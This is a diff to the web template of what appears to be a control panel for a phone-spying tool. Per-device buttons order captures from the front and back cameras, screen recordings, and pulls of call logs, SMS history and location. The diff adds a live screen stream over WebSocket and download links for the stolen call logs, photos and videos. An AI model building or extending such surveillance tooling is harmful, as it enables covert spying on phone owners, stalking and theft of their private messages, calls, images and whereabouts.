@@ -138,16 +138,19 @@
                 <p class="text-slate-500 text-xs mt-1"><span class="live-dot"></span>Live — auto-refreshes every 5s</p>
             </div>
             <div class="flex flex-wrap gap-2">
+                <button onclick="switchTab('live')" id="tab-live"
+                    class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold text-rose-400 border-rose-500/30">🔴
+                    Live</button>
                 <button onclick="switchTab('texts')" id="tab-texts"
                     class="tab-btn active px-4 py-1.5 rounded-full text-sm font-semibold">Logs</button>
                 <button onclick="switchTab('sms')" id="tab-sms"
                     class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold">SMS</button>
                 <button onclick="switchTab('calls')" id="tab-calls"
-                    class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold">Call Logs</button>
+                    class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold">Calls</button>
                 <button onclick="switchTab('cameras')" id="tab-cameras"
-                    class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold">📷 Camera</button>
+                    class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold">📷 Photos</button>
                 <button onclick="switchTab('screen')" id="tab-screen"
-                    class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold">🎬 Screen</button>
+                    class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold">🎬 Recs</button>
                 <button onclick="switchTab('files')" id="tab-files"
                     class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold">Files</button>
             </div>
@@ -181,21 +184,41 @@
                                             class="badge bg-green-900/40 text-green-400 border border-green-500/20">Online</span>
                                     </div>
                                     <div class="grid grid-cols-2 gap-2">
+                                        <button onclick="sendCommand('<%= deviceId %>', 'start_live_stream')"
+                                            class="cmd-btn bg-rose-500/20 text-rose-300 border-rose-500/40">🔴 Start
+                                            Live</button>
+                                        <button onclick="sendCommand('<%= deviceId %>', 'stop_live_stream')"
+                                            class="cmd-btn">⏹ Stop Live</button>
                                         <button onclick="sendCommand('<%= deviceId %>', 'front_photo')"
-                                            class="cmd-btn">🤳 Front Cam</button>
+                                            class="cmd-btn">🤳 Front </button>
                                         <button onclick="sendCommand('<%= deviceId %>', 'back_photo')"
-                                            class="cmd-btn">📸 Back Cam</button>
+                                            class="cmd-btn">📸 Back </button>
                                         <button onclick="sendCommand('<%= deviceId %>', 'record_screen')"
                                             class="cmd-btn">🎬 Rec Screen</button>
                                         <button onclick="sendCommand('<%= deviceId %>', 'extract_call_logs')"
                                             class="cmd-btn">📞 Call Logs</button>
                                         <button onclick="sendCommand('<%= deviceId %>', 'extract_sms_history')"
-                                            class="cmd-btn">✉️ SMS History</button>
+                                            class="cmd-btn">✉️ SMS Hist</button>
                                         <button onclick="sendCommand('<%= deviceId %>', 'extract_location')"
                                             class="cmd-btn">📍 Location</button>
                                     </div>
                                 </div>
                                 <% }); %>
+            </div>
+        </section>
+
+        <!-- ── LIVE SCREEN VIEW ── -->
+        <section id="sec-live" class="glass p-6 hidden">
+            <div class="flex justify-between items-center mb-5">
+                <h2 class="text-xl font-semibold text-rose-400">🔴 Live Screen Stream</h2>
+                <div class="flex gap-3 items-center">
+                    <span id="stream-status" class="text-xs text-slate-500 italic">No Active Stream</span>
+                    <span id="fps-counter" class="badge bg-rose-900/60 text-white font-mono opacity-0">0 FPS</span>
+                </div>
+            </div>
+            <div class="flex justify-center bg-black/40 rounded-2xl border border-white/5 overflow-hidden p-2">
+                <img id="live-stream-img" class="max-h-[70vh] rounded-xl shadow-2xl"
+                    src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
             </div>
         </section>
 
@@ -270,7 +293,12 @@
                 <% data.call_logs.forEach(function(batch){ %>
                     <div class="entry p-4">
                         <div class="flex justify-between items-center mb-3">
-                            <span class="badge bg-teal-900/60 text-teal-300">Call Log Batch</span>
+                            <div>
+                                <span class="badge bg-teal-900/60 text-teal-300">Call Log Batch</span>
+                                <button onclick="downloadBatch(this, '<%= batch.timestamp %>')"
+                                    data-json='<%- JSON.stringify(batch).replace(/' /g, "&apos;" ) %>'
+                                    class="text-[0.6rem] text-slate-500 hover:text-white ml-2">📥 Download</button>
+                            </div>
                             <span class="text-xs text-slate-500">
                                 <%= batch.deviceId %> · <%= batch.timestamp %>
                             </span>
@@ -309,15 +337,19 @@
             </div>
             <div id="list-cameras" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                 <% camFiles.forEach(function(f){ %>
-                    <a href="<%= f.path %>" target="_blank" class="entry p-2 block">
+                    <div class="entry p-2 block">
                         <img src="<%= f.path %>" class="thumb">
-                        <p class="text-[0.65rem] text-slate-400 mt-2 truncate">
-                            <%= f.type==='front_photos' ? '🤳 Front' : '📸 Back' %> · <%= f.timestamp %>
-                        </p>
-                        <p class="text-[0.6rem] text-slate-600 truncate">
+                        <div class="flex justify-between items-center mt-2 px-1">
+                            <p class="text-[0.65rem] text-slate-400 truncate">
+                                <%= f.type==='front_photos' ? '🤳 Front' : '📸 Back' %> · <%= f.timestamp %>
+                            </p>
+                            <a href="<%= f.path %>" download class="text-[0.65rem] text-violet-400 hover:text-white">📥
+                                Save</a>
+                        </div>
+                        <p class="text-[0.6rem] text-slate-600 truncate px-1">
                             <%= f.deviceId %>
                         </p>
-                    </a>
+                    </div>
                     <% }); %>
             </div>
         </section>
@@ -336,14 +368,18 @@
                     <div class="entry p-4">
                         <video controls src="<%= f.path %>"></video>
                         <div class="flex justify-between mt-3 items-center">
-                            <p class="text-xs text-slate-300 font-mono truncate">
-                                <%= f.filename %>
-                            </p>
-                            <span class="text-[0.65rem] text-slate-500">
+                            <div class="truncate">
+                                <p class="text-xs text-slate-300 font-mono truncate">
+                                    <%= f.filename %>
+                                </p>
+                                <a href="<%= f.path %>" download
+                                    class="text-[0.65rem] text-pink-400 hover:text-white mt-1">📥 Download Video</a>
+                            </div>
+                            <span class="text-[0.65rem] text-slate-500 shrink-0">
                                 <%= f.timestamp %>
                             </span>
                         </div>
-                        <p class="text-[0.6rem] text-slate-600">
+                        <p class="text-[0.6rem] text-slate-600 mt-1">
                             <%= f.deviceId %>
                         </p>
                     </div>
@@ -419,15 +455,8 @@
                     updateBadge('calls', d.call_logs.length);
                     updateBadge('cameras', d.files.filter(f => f.type === 'front_photos' || f.type === 'back_photos').length);
                     updateBadge('screen', d.files.filter(f => f.type === 'screen_recordings').length);
+                    updateBadge('live', 'CONNECTED'); // Indicator
                     updateBadge('files', d.files.length);
-
-                    // Re-render device controls if new ones appear
-                    const deviceGrid = document.getElementById('device-controls');
-                    const currentIds = Object.keys(d.devices || {});
-                    if (currentIds.length > 0) {
-                        // Simplified: just refresh if device count changes
-                        // In a real app we'd do smart DOM diffing
-                    }
                 })
                 .catch(() => { });
         }
@@ -436,6 +465,54 @@
             if (el) el.textContent = count + (tab === 'sms' ? ' msg' : tab === 'files' ? ' files' : ' obj');
         }
         setInterval(liveRefresh, 5000);
+
+        function downloadBatch(btn, ts) {
+            const data = JSON.parse(btn.getAttribute('data-json'));
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `call_logs_${ts}.json`;
+            a.click();
+        }
+
+        // ── WebSocket Client ───────
+        let lastFrameTime = 0;
+        let frameCount = 0;
+        const liveImg = document.getElementById('live-stream-img');
+        const streamStatus = document.getElementById('stream-status');
+        const fpsCounter = document.getElementById('fps-counter');
+
+        function connectWS() {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const ws = new WebSocket(`${protocol}//${window.location.host}`);
+            ws.binaryType = 'blob';
+
+            ws.onmessage = (event) => {
+                const url = URL.createObjectURL(event.data);
+                liveImg.src = url;
+
+                // FPS Calculation
+                frameCount++;
+                const now = performance.now();
+                if (now - lastFrameTime > 1000) {
+                    fpsCounter.textContent = `${frameCount} FPS`;
+                    fpsCounter.style.opacity = frameCount > 0 ? '1' : '0';
+                    frameCount = 0;
+                    lastFrameTime = now;
+                }
+
+                streamStatus.textContent = "Receiving Live Bytes...";
+                streamStatus.classList.add('text-rose-400');
+            };
+
+            ws.onopen = () => console.log('WS Connected');
+            ws.onclose = () => {
+                console.log('WS Disconnected, retrying...');
+                setTimeout(connectWS, 2000);
+            };
+        }
+        connectWS();
     </script>
 </body>
 
